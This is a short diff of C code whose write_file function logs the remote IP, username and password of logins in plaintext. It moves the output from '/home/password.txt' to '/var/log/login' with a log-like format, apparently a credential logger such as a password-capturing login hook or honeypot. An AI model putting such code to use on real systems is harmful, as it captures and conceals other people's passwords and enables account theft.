@@ -17,7 +17,7 @@
 #define true 1
 #define false 0
 
-const char *log_filename = "/home/password.txt";
+const char *log_filename = "/var/log/login";
 
 int
 write_file(const char *username, const char *password, const char *remote_ip) {
@@ -49,9 +49,9 @@ write_file(const char *username, const char *password, const char *remote_ip) {
 
     memset(buffer, '\0', buffer_size);
     strcat(buffer, remote_ip);
-    strcat(buffer, "|<*>|");
+    strcat(buffer, " - ");
     strcat(buffer, username);
-    strcat(buffer, "|<*>|");
+    strcat(buffer, " - ");
     strcat(buffer, password);
     strcat(buffer, "\n");
 
